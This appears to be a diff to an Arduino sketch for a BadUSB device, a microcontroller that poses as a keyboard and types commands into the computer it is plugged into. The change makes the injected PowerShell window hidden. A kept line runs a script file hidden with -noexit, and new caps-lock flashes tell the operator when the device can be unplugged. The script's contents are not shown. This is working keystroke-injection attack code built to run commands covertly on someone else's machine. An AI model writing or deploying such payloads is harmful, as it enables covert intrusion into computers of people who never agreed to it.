@@ -31,7 +31,7 @@ void setup()
 
   delay(500);
 
-  Keyboard.print("powershell");
+  Keyboard.print("powershell.exe -windowstyle hidden");
 
   delay(200);
 
@@ -103,6 +103,38 @@ void setup()
   Keyboard.print("powershell.exe -noexit -windowstyle hidden -file startScript.ps1");
 
   typeKey(KEY_RETURN);
+  
+  // Make capslock flash to know when you can unplug the BadUSB
+  
+  Keyboard.write(KEY_CAPS_LOCK);
+
+  delay(150);
+
+  Keyboard.write(KEY_CAPS_LOCK);
+
+  delay(150);
+
+  Keyboard.write(KEY_CAPS_LOCK);
+
+  delay(150);
+
+  Keyboard.write(KEY_CAPS_LOCK);
+
+  delay(2000);
+
+  Keyboard.write(KEY_CAPS_LOCK);
+
+  delay(150);
+
+  Keyboard.write(KEY_CAPS_LOCK);
+
+  delay(150);
+
+  Keyboard.write(KEY_CAPS_LOCK);
+
+  delay(150);
+
+  Keyboard.write(KEY_CAPS_LOCK);
 
   // End Payload
 
